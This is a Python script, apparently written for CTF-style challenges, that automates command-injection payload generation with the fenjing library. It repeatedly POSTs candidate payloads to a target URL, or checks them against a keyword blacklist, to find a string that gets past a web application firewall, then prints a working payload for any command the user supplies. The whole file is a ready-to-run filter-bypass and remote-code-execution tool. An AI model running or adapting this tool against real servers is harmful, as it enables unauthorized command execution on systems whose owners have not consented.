#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import argparse
import requests
import logging
from functools import lru_cache
from fenjing import exec_cmd_payload

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")

def make_waf_checker_by_response(url, headers=None, cookies=None, bad_markers=None, sleep_s=0.01):
    """
    返回一个 waf(payload:str)->bool 函数：
      - 将 payload POST 到 url（字段名: data_key）
      - 如果响应文本中不包含 bad_markers 中的任何一项，视为通过
    """
    headers = headers or {}
    cookies = cookies or {}
    bad_markers = bad_markers or ["你确定", "这些词不能用", "好像不太对"]
    @lru_cache(maxsize=8192)
    def waf(payload: str) -> bool:
        time.sleep(sleep_s)
        resp = requests.post(url, headers=headers, cookies=cookies, timeout=10, data={"she": payload})
        text = resp.text
        logging.debug(f"Payload `{payload[:30]}…` → Response start: {text[:50]!r}")
        return not any(marker in text for marker in bad_markers)
    return waf

def make_waf_checker_by_blacklist(blacklist, sleep_s=0.0):
    """
    返回一个 waf(payload:str)->bool 函数：
      - 只要 payload 中不包含 blacklist 里的任意子串，就视为通过
    """
    @lru_cache(maxsize=8192)
    def waf(payload: str) -> bool:
        if sleep_s:
            time.sleep(sleep_s)
        for word in blacklist:
            if word in payload:
                logging.debug(f"Rejected `{payload[:30]}…` because contains `{word}`")
                return False
        return True
    return waf

def main():
    parser = argparse.ArgumentParser(description="自动化命令注入爆破模板 (fenjing)")
    parser.add_argument("--url",     help="检测接口 URL",        required=True)
    parser.add_argument("--data",    help="POST 字段名",        default="she")
    parser.add_argument("--cmd",     help="要执行的命令",       required=True)
    parser.add_argument("--mode",    help="检测方式: response|blacklist", default="response")
    parser.add_argument("--marker",  help="拦截提示词(逗号分隔)", default="你确定,这些词不能用,好像不太对")
    parser.add_argument("--black",   help="屏蔽子串(逗号分隔)", default="_ . + ~ [ ] 0,1,2,3,4,5,6,7,8,9")
    parser.add_argument("--delay",   type=float, help="每次请求间隔(s)", default=0.01)
    parser.add_argument("--cookie",  help="要带的 Cookie 字符串", default=None)
    parser.add_argument("--header",  help="要带的额外 Header，格式 Key:Value", nargs="*", default=[])
    args = parser.parse_args()

    # 构造 requests 参数
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"}
    for kv in args.header:
        if ":" in kv:
            k,v = kv.split(":",1)
            headers[k.strip()] = v.strip()
    cookies = {}
    if args.cookie:
        # 简单地把整个字符串当单个 session cookie
        cookies["session"] = args.cookie

    # 选择 WAF 检测函数
    if args.mode == "response":
        waf = make_waf_checker_by_response(
            url=args.url, headers=headers, cookies=cookies,
            bad_markers=[m.strip() for m in args.marker.split(",")],
            sleep_s=args.delay
        )
    else:
        waf = make_waf_checker_by_blacklist(
            blacklist=[b.strip() for b in args.black.split(",")],
            sleep_s=args.delay
        )

    # 自动爆破
    logging.info(f"开始针对命令 `{args.cmd}` 的自动注入爆破（mode={args.mode}）…")
    payload, _ = exec_cmd_payload(waf, args.cmd)
    print("\n✅ 找到可用 payload：\n")
    print(payload)

if __name__ == "__main__":
    main()
